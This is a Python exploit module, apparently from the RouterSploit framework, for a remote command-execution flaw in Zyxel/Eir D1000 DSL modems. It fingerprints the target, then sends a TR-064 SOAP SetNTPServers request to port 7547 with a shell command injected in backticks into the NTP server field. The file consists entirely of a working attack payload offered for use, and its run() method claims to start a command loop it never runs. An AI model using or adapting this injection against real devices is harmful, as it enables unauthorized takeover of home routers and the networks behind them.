# rsf exploit module
# description: Module exploits Remote Command Execution vulnerability in Zyxel/Eir D1000 devices. If the target is vulnerable it allows to execute commands on operating system level.

import socket
import requests

class Exploit:
    __info__ = {
        "name": "Zyxel Eir D1000 RCE",
        "description": "Module exploits Remote Command Execution vulnerability in Zyxel/Eir D1000 devices. If the target is vulnerable it allows to execute commands on operating system level.",
        "authors": ("kenzo", "Marcin Bury <marcin[at]threat9.com>"),
        "references": (
            "https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/",
            "https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759",
            "https://broadband-forum.org/technical/download/TR-064.pdf",
        ),
        "devices": ("Zyxel EIR D1000",),
    }

    def __init__(self, target, port=7547):
        self.target = target
        self.port = port

    def run(self):
        if self.check():
            print("Target appears to be vulnerable")
            print("Invoking command loop...")
            print("It is blind command injection - response is not available")
        else:
            print("Target seems to be not vulnerable")

    def execute(self, cmd):
        headers = {
            "Content-Type": "text/xml",
            "SOAPAction": "urn:dslforum-org:service:Time:1#SetNTPServers"
        }
        data = """<?xml version="1.0"?>
                  <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                  <SOAP-ENV:Body>
                  <u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">
                  <NewNTPServer1>`{}`</NewNTPServer1>
                  <NewNTPServer2></NewNTPServer2>
                  <NewNTPServer3></NewNTPServer3>
                  <NewNTPServer4></NewNTPServer4>
                  <NewNTPServer5></NewNTPServer5>
                  </u:SetNTPServers>
                  </SOAP-ENV:Body>
                  </SOAP-ENV:Envelope>""".format(cmd)
        response = requests.post(f'http://{self.target}:{self.port}/UD/act?1', headers=headers, data=data)
        return response

    def check(self):
        response = requests.get(f'http://{self.target}:{self.port}/globe')
        if response.status_code == 404 and "home_wan.htm" in response.text:
            return True
        return False

